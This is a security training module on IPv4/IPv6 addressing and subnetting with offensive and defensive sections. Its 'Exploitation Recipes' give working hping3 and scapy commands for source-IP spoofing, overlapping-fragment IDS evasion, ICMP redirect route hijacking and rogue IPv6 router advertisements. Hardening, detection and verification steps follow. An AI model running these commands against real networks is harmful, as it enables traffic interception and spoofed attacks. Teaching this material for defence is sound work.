# IP Addressing and Subnetting

> Track: Offensive / Defensive | Level: Foundation | Certs: Network+, CCNA

## 1. Overview

IP addressing is how hosts are identified on a network, and
subnetting is how those addresses are organized into segments.
Every layer 3 operation depends on both: routing, NAT, firewalls,
ACLs, VPNs, and cloud networking all speak in terms of prefixes
and subnets.

Three things make this layer worth studying in depth:

- Subnetting is the single most common interview question and the
  single most common source of misconfiguration in real networks.
  A wrong mask silently breaks connectivity in ways that look like
  application bugs.
- IPv4 exhaustion has made NAT and address planning a design
  constraint, not an afterthought. Understanding CIDR and NAT is
  required to reason about why a network is shaped the way it is.
- IPv6 is not optional anymore. Dual-stack hosts often have an
  unmonitored IPv6 path, and many environments that are well-
  defended on IPv4 have an IPv6 network nobody watches.

The vocabulary: IP address (32-bit for IPv4, 128-bit for IPv6),
subnet mask / prefix length, CIDR, network address, broadcast
address, gateway, NAT, private ranges (RFC 1918), loopback,
link-local.

## 2. Reconnaissance / Enumeration

From outside, IP reconnaissance is the standard nmap workflow. From
inside, the questions are: what subnets exist, what is the gateway,
what is the DNS server, and what is reachable.

**Local configuration:**

```bash
# IPv4 and IPv6 addresses, prefix, flags
ip addr show

# Routing table (gateway + connected subnets)
ip route show

# DNS configuration
cat /etc/resolv.conf

```

**Reachable hosts on the local segment:**

```bash
# ARP table (IPv4 neighbors)
ip neigh show

# ICMP sweep of a subnet (fast, noisy)
nmap -sn 10.10.10.0/24

# IPv6 neighbors
ip -6 neigh show

```

**IPv6 specifics:**

```bash
# Link-local addresses (fe80::/10) and global addresses
ip -6 addr show

# Router advertisements (are we getting IPv6 from the gateway?)
sudo tcpdump -i eth0 -n icmp6

```

**Gateway fingerprint:**

```bash
# TTL of the gateway tells you the OS
ping -c 1 10.10.10.1 | grep ttl

# Traceroute reveals the first hop
traceroute -n 10.10.10.1

```

**Private ranges (RFC 1918):** if the target is in 10.0.0.0/8,
172.16.0.0/12, or 192.168.0.0/16, you are talking to a NAT boundary
or a VPN. The public IP is on the other side.

**Cloud-specific:** in AWS a VPC has a CIDR (e.g. 10.0.0.0/16),
subnets are /24 or smaller, and security groups are the layer 3-4
control. The same reconnaissance questions apply, but the answers
come from the cloud API, not from `ip addr`.


## 3. Common Attack Vectors

IP-layer attacks fall into three families: spoofing, fragmentation,
and reachability manipulation. Each exploits a specific trust in the
IP header.

**Spoofing (hide your source):**
- Source IP spoofing (used for reflection/amplification DDoS).
- Fragmentation overlap to bypass IDS signatures.
- ICMP redirect to change the victim routing table.
- ARP spoofing is layer 2, but it is how you spoof IP on a local
  segment (see the Ethernet and Switching file).

**Fragmentation (break the parser):**
- Tiny fragment attack (first fragment too small to hold the
  transport header).
- Overlapping fragments (two fragments claim the same offset).
- Fragment flood (exhaust reassembly buffers).

**Reachability manipulation:**
- ICMP unreachable to blackhole a route.
- Router advertisement / DHCPv6 spoofing on IPv6.
- IPv6 router advertisement flood (fake default gateway).
- BGP hijacking (route-level, not host-level).

The common thread: IP has no authentication. Every field in the
header is attacker-controlled unless a higher layer (IPsec, TLS)
or a network control (ingress filtering, uRPF) validates it.

## 4. Exploitation Recipes

Each recipe is a minimal, safe-to-test example. All commands are
run only against systems you own or have written authorization to
test.

### Recipe 1 - CIDR and subnet math

Every exploitation recipe below assumes you can compute network,
broadcast, and host range from an address and a prefix. Practice
until it is automatic.

```bash
# Python one-liner for subnet math (stdlib)
python3 -c "
import ipaddress
net = ipaddress.ip_network('10.10.10.42/26', strict=False)
print('network  :', net.network_address)
print('broadcast:', net.broadcast_address)
print('hosts    :', net.num_addresses - 2)
print('first    :', list(net.hosts())[0])
print('last     :', list(net.hosts())[-1])
"

```

Expected output:

```text
network  : 10.10.10.0
broadcast: 10.10.10.63
hosts    : 62
first    : 10.10.10.1
last     : 10.10.10.62

```

A /26 divides a /24 into 4 subnets of 64 addresses each. The
network and broadcast are reserved, leaving 62 usable hosts per
subnet. This is the arithmetic behind every ACL and firewall rule.

### Recipe 2 - Source IP spoofing (with hping3)

Sends a packet with a forged source IP. The reply goes to the
forged address, not to you. This is why spoofing is used for
reflection DDoS, not for direct exploitation.

```bash
# Send a SYN from a forged source (reply goes elsewhere)
sudo hping3 -S -a 1.2.3.4 -p 80 10.10.10.10

# Verify the target sees the spoofed source in its logs
# (on the target: tcpdump -i eth0 -n tcp port 80)

```

Legitimate use: test ingress filtering. If the target replies to
1.2.3.4, your egress filter is not blocking spoofed sources.

### Recipe 3 - Fragmentation overlap (IDS bypass test)

Sends two fragments that overlap. The target OS reassembles them
one way, the IDS another. Classic IDS evasion.

```bash
# Overlapping fragments (requires a fragment-capable tool)
sudo fragroute -f frag.conf 10.10.10.10

# Or with scapy: send two fragments at offset 0 and offset 1
sudo python3 -c "
from scapy.all import *
pkt = IP(dst='10.10.10.10')/TCP(dport=80, flags='S')
frag1 = fragment(pkt, fragsize=8)
send(frag1)
"

```

Modern IDS reassemble the same way the target does, so this
mostly fails against current Suricata/Zeek. It still works
against old appliances and simple netfilter rules.

### Recipe 4 - ICMP redirect

Tells the victim to send traffic for a specific destination through
you instead of the gateway. Requires the victim to accept ICMP
redirects (many Linux hosts do by default, Windows does not).

```bash
# Send an ICMP redirect telling 10.10.10.10 to route 8.8.8.8 via us
sudo hping3 -C 5 -K 1 -a 10.10.10.1 --icmptype 5 --icmpcode 1 10.10.10.10

# Verify on the victim: ip route get 8.8.8.8 (should now point at us)

```

Defense is one sysctl: `net.ipv4.conf.all.accept_redirects=0`.
This is why the OSI file lists it under preventive controls.

### Recipe 5 - IPv6 router advertisement spoofing

On an IPv6 network, a rogue RA can become the default gateway for
every host on the segment. This is the IPv6 equivalent of DHCP
spoofing, and it is often unmonitored.

```bash
# Send a rogue router advertisement (requires radvd or scapy)
sudo python3 -c "
from scapy.all import *
ra = IPv6(dst='ff02::1')/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix='2001:db8::', prefixlen=64)/ICMPv6NDOptRDNSS(dns='2001:db8::1')
send(ra, iface='eth0')
"

```

Expected state on the victim: `ip -6 route` shows your link-local
address as the default gateway. Every IPv6 packet now flows through
you. Section 6 covers RA guard.

All five recipes are detectable by modern IDS and by IPv6 RA guard
on managed switches. The point is not that they always work - it
is that they exist, and the defenses are opt-in.

## 5. Post-Exploitation

Once you control IP-layer reachability, the post-exploitation
options are about what you can reach and what you can hide.

**Pivot into a new subnet:** once you have a foothold on a host
that can reach a second subnet, that host becomes a router for
you. SOCKS proxy and SSH port forwarding are the standard tools.
This is the layer 3 pivot described in the OSI file, section 5.

**Hide your source:** a spoofed source IP means the target cannot
trace back to you. Combined with a compromised host on the same
segment (layer 2), you can source traffic from an innocent host.
This is why both layers matter for attribution.

**Reachability mapping:** after a pivot, the standard workflow is:
IP sweep, port scan, service fingerprint. Each step is a layer 3
reachability test before it is a layer 4-7 test.

```bash
# From a pivoted host, sweep the new subnet
nmap -sn 172.16.0.0/24

# Then port-scan the live hosts
nmap -sT -p- --min-rate 5000 172.16.0.1 172.16.0.10 172.16.0.20

```

**IPv6 pivot:** dual-stack hosts often have an IPv6 path that is
not filtered the same way as IPv4. If `ip -6 route` shows a global
prefix and the firewall is IPv4-only, the IPv6 path is the easier
route. This is one of the most common findings in internal
assessments.


## 6. Preventive Controls

IP-layer hardening is about validating what the header claims.

**Ingress and egress filtering (BCP 38 / RFC 2827):** block packets
with a source address that does not belong on the interface they
arrive on. This is the single most effective anti-spoofing control.

```bash
# Linux iptables: drop packets claiming a source outside our subnet
iptables -A INPUT -i eth0 -s 10.10.10.0/24 -j ACCEPT
iptables -A INPUT -i eth0 -j DROP

```

**Unicast Reverse Path Forwarding (uRPF):** a router checks that
the return path to the source address goes out the same interface.
Spoofed sources fail the check. Cisco: `ip verify unicast source
reachable-via rx`.

**Disable ICMP redirects on hosts:**

```bash
sudo sysctl -w net.ipv4.conf.all.accept_redirects=0
sudo sysctl -w net.ipv4.conf.default.accept_redirects=0
sudo sysctl -w net.ipv4.conf.all.send_redirects=0

```

Persist in `/etc/sysctl.conf` so it survives reboot.

**Reject source-routed packets:**

```bash
sudo sysctl -w net.ipv4.conf.all.accept_source_route=0

```

**IPv6 RA guard:** on managed switches, block router advertisements
on access ports (the equivalent of BPDU guard for IPv6). Cisco:
`ipv6 nd raguard policy HOST`.

**IPv6 first-hop security:** enable DHCPv6 snooping, ND inspection,
and RA guard together. IPv6 has more first-hop attack surface than
IPv4 because every host self-configures from RAs.

**NAT is not a security control:** NAT hides internal addresses,
but it does not stop spoofing, fragmentation, or any of the attacks
in section 3. Treat NAT as an addressing mechanism, not a firewall.

## 7. Detection Controls

Each attack in section 3 has a matching detection.

**Spoofing detection:**
- Source addresses that do not match the interface ingress.
- uRPF drop counters on routers.
- Asymmetric traffic (reply goes to a different path than request).
- BGP prefix anomalies (route leaks, hijacks) via RPKI.

**Fragmentation detection:**
- Fragment overlap alerts (Snort/Suricata rule families).
- Fragment rate anomalies (fragment flood).
- Tiny fragments (first fragment shorter than the transport header).

**ICMP redirect detection:**
- ICMP type 5 received on a host that should not accept it.
- Routing table change events correlated with ICMP.

**IPv6 detection:**
- Rogue RA alerts (RA guard logs, ND inspection logs).
- DHCPv6 spoofing (DHCPv6 snooping logs).
- IPv6 traffic on a network that was supposed to be IPv4-only.

**SIEM correlation:** the interesting detection is "new IPv6 route
+ outbound traffic to an unknown global prefix". Either a legitimate
IPv6 rollout or a rogue RA. The correlation tells you which.

## 8. Verification

How to verify each control.

**Verify ingress filtering:**

```bash
# Send a spoofed-source packet from outside the allowed range
sudo hping3 -S -a 1.2.3.4 -p 80 10.10.10.10
# Expect: no reply from the target (the filter drops the spoofed source)

```

**Verify ICMP redirects are disabled:**

```bash
sysctl net.ipv4.conf.all.accept_redirects
# Expect: net.ipv4.conf.all.accept_redirects = 0

```

**Verify RA guard:**

```bash
# Send a rogue RA from an access port
sudo python3 -c "from scapy.all import *; send(IPv6(dst='ff02::1')/ICMPv6ND_RA(), iface='eth0')"
# Expect: the switch logs "RA guard drop" and the host keeps its old gateway

```

**Verify source routing is disabled:**

```bash
sysctl net.ipv4.conf.all.accept_source_route
# Expect: net.ipv4.conf.all.accept_source_route = 0

```

**Verify subnet math understanding:** the best evidence that you
understand the layer is to predict, before running a command, the
network and broadcast address of a given prefix. If you predicted
10.10.10.0/26 and got 10.10.10.64/26, recompute. This is the habit
that prevents ACL mistakes.

## 9. Certification Alignment

**CompTIA Network+ (N10-009):**
- Domain 1: Networking Concepts - IPv4 and IPv6 addressing,
  subnetting, CIDR, NAT, private ranges.
- Domain 4: Network Security - spoofing, fragmentation attacks,
  ICMP redirect, RA guard, ingress filtering.

**Cisco CCNA (200-301):**
- Domain 1: Network Fundamentals - IPv4 and IPv6 addressing,
  subnetting, VLSM, CIDR.
- Domain 3: IP Connectivity - routing table, static routes,
  first-hop redundancy, NAT.
- Domain 4: IP Services - NAT/PAT, DHCP, NTP, DNS.
- Domain 5: Security Fundamentals - uRPF, ACLs, IPv6 first-hop
  security.

**Cross-references:**
- The OSI and TCP-IP file covers the layer model this builds on.
- 02 Ethernet and Switching covers the layer 2 framing that carries
  these IP packets.
- 04 Network Protocols covers the transport and application
  protocols that run on top of IP.

## 10. Production Notes

**Subnetting is the most common source of production incidents.**
A wrong mask on a VLAN interface silently breaks connectivity for
some hosts and not others. The symptom looks like an application
bug. Always verify network and broadcast before deploying an ACL.

**NAT is not a security control.** This is stated twice on purpose.
NAT hides addresses; it does not authenticate, validate, or filter.
A firewall rule that says "internal only" must be an actual firewall
rule, not a NAT design assumption.

**IPv6 is not "IPv4 with longer addresses".** It has different
first-hop behavior (RAs instead of DHCP by default), different
fragmentation (routers do not fragment), and different spoofing
surface (every host can self-configure). The controls are similar
in spirit and different in implementation.

**Cloud networking changes the diagram, not the model.** In a VPC,
subnets, route tables, and security groups are the layer 3 controls.
The subnet math is the same. The reconnaissance is different (API
instead of `ip addr`), but the reasoning is identical.

**Private address space is a coordination problem.** Two
organizations that both use 10.0.0.0/8 cannot merge without NAT or
renumbering. This is why RFC 1918 is a planning constraint, not
just a convenience.

## 11. References

- RFC 791 - Internet Protocol - https://www.rfc-editor.org/rfc/rfc791
- RFC 8200 - Internet Protocol, Version 6 - https://www.rfc-editor.org/rfc/rfc8200
- RFC 1918 - Address Allocation for Private Internets - https://www.rfc-editor.org/rfc/rfc1918
- RFC 2827 - Network Ingress Filtering (BCP 38) - https://www.rfc-editor.org/rfc/rfc2827
- RFC 4632 - Classless Inter-domain Routing (CIDR) - https://www.rfc-editor.org/rfc/rfc4632
- RFC 3022 - Traditional IP Network Address Translator (NAT) - https://www.rfc-editor.org/rfc/rfc3022
- RFC 4291 - IP Version 6 Addressing Architecture - https://www.rfc-editor.org/rfc/rfc4291
- RFC 4861 - Neighbor Discovery for IP version 6 (IPv6) - https://www.rfc-editor.org/rfc/rfc4861
- NIST SP 800-119 - Guidelines for the Secure Deployment of IPv6 - https://csrc.nist.gov/pubs/sp/800/119/final
- CompTIA Network+ exam objectives - https://www.comptia.org/certifications/network
- Cisco CCNA exam topics - https://learningnetwork.cisco.com/s/ccna-exam-topics

